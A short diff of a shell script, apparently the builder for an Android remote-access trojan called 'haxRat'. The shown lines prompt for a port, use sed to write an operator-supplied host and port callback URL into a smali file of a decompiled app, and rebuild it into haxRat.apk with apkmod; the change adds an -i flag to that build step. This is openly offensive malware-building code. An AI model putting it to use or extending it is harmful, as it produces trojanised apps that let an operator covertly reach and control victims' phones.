@@ -16,4 +16,4 @@ read -p "[*] PORT : " port
 
 sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
 
-apkmod -R "$appPath" -o ~/haxrat/haxRat.apk
+apkmod -R -i "$appPath" -o ~/haxrat/haxRat.apk
